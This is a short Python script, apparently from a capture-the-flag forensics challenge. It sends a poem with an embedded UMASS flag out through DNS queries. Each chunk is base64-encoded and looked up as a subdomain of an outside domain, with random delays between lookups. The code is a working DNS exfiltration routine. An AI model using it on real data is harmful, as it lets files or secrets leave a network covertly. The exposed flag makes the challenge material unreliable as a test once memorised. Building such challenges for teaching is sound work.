import dns.resolver
from base64 import b64encode
import time
import random


CHUNK_SIZE = 24

DATA = b"""Do not go gentle into that good night,
Old age should burn and rave at close of day;
Rage, rage against the dying of the light.
UMASS{dnS_3xf1l7r4t10n_15_4w3s0m3}
Though wise men at their end know dark is right,
Because their words had forked no lightning they
Do not go gentle into that good night.
Rage, rage against the dying of the light."""

def exfiltrate_data(data):
    chunks = [data[i:i+CHUNK_SIZE] for i in range(0, len(data), CHUNK_SIZE)]
    for i, chunk in enumerate(chunks):
        chunk = b64encode(chunk).decode('utf-8')
        domain = f'{chunk}.taaaaarrrrrrrssss.com'
        print(f'{i+1}/{len(chunks)}: {domain}')
        try:
            dns.resolver.resolve(domain, 'A')
        except:
            pass
        time.sleep(random.random() * 2)
        

if __name__ == '__main__':
    exfiltrate_data(DATA)